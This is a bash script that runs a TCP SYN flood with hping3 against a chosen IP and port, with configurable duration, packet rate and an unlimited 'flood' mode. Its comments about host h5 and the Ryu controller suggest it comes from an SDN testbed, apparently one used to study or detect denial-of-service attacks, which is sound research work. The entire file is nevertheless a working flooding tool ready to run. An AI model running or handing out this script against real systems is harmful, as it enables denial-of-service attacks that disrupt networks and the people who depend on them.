#!/usr/bin/env bash
# SYN flood from this host (use on h5).
#   attack_syn_flood.sh [TARGET=10.0.0.1] [DURATION=60] [RATE=1000|flood] [PORT=80]
# RATE = SYNs per second. "flood" = hping3 --flood (as fast as possible; this can
# overwhelm Ryu with PacketIn and produce huge captures, so use a number first).
target="${1:-10.0.0.1}"; dur="${2:-60}"; rate="${3:-1000}"; port="${4:-80}"
if [ "$rate" = "flood" ]; then
  timeout "$dur" hping3 -S --flood -p "$port" "$target" >/dev/null 2>&1
else
  interval=$(( 1000000 / rate ))
  timeout "$dur" hping3 -S -p "$port" -i "u$interval" "$target" >/dev/null 2>&1
fi
exit 0
